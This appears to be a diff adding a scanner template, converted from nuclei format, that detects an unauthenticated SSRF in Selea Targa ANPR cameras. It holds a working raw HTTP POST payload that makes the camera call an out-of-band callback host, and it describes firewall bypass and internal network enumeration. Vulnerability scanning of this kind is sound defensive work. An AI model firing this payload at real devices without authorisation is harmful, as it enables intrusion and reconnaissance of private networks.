@@ -1,0 +1,119 @@
+{
+  "id": "targa-camera-ssrf",
+  "name": "Selea Targa IP OCR-ANPR Camera - Unauthenticated SSRF",
+  "author": "gy741",
+  "severity": "HIGH",
+  "description": "Unauthenticated Server-Side Request Forgery (SSRF) vulnerability exists in the Selea ANPR camera within several functionalities. The application parses user supplied data in the POST JSON parameters \u0027ipnotify_address\u0027 and \u0027url\u0027 to construct an image request or check DNS for IP notification. Since no validation is carried out on the parameters, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host. This can be used by an external attacker for example to bypass firewalls and initiate a service and network enumeration on the internal network through the affected application.",
+  "references": [
+    "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5617.php"
+  ],
+  "tags": [
+    "targa",
+    "ssrf",
+    "oast",
+    "iot",
+    "camera",
+    "selea"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /cps/test_backup_server?ACTION\u003dTEST_IP\u0026NOCONTINUE\u003dTRUE HTTP/1.1\nHost: {{Hostname}}\ncontent-type: application/json\nAccept: */*\n\n{\"test_type\":\"ip\",\"test_debug\":false,\"ipnotify_type\":\"http/get\",\"ipnotify_address\":\"http://{{interactsh-url}}\",\"ipnotify_username\":\"\",\"ipnotify_password\":\"\",\"ipnotify_port\":\"0\",\"ipnotify_content_type\":\"\",\"ipnotify_template\":\"\"}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "interactsh_protocol",
+          "values": [
+            "http"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "targa-camera-ssrf",
+    "info": {
+      "name": "Selea Targa IP OCR-ANPR Camera - Unauthenticated SSRF",
+      "author": "gy741",
+      "severity": "high",
+      "description": "Unauthenticated Server-Side Request Forgery (SSRF) vulnerability exists in the Selea ANPR camera within several functionalities. The application parses user supplied data in the POST JSON parameters \u0027ipnotify_address\u0027 and \u0027url\u0027 to construct an image request or check DNS for IP notification. Since no validation is carried out on the parameters, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host. This can be used by an external attacker for example to bypass firewalls and initiate a service and network enumeration on the internal network through the affected application.",
+      "reference": [
+        "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5617.php"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "targa,ssrf,oast,iot,camera,selea"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /cps/test_backup_server?ACTION\u003dTEST_IP\u0026NOCONTINUE\u003dTRUE HTTP/1.1\nHost: {{Hostname}}\ncontent-type: application/json\nAccept: */*\n\n{\"test_type\":\"ip\",\"test_debug\":false,\"ipnotify_type\":\"http/get\",\"ipnotify_address\":\"http://{{interactsh-url}}\",\"ipnotify_username\":\"\",\"ipnotify_password\":\"\",\"ipnotify_port\":\"0\",\"ipnotify_content_type\":\"\",\"ipnotify_template\":\"\"}\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "interactsh_protocol",
+            "words": [
+              "http"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
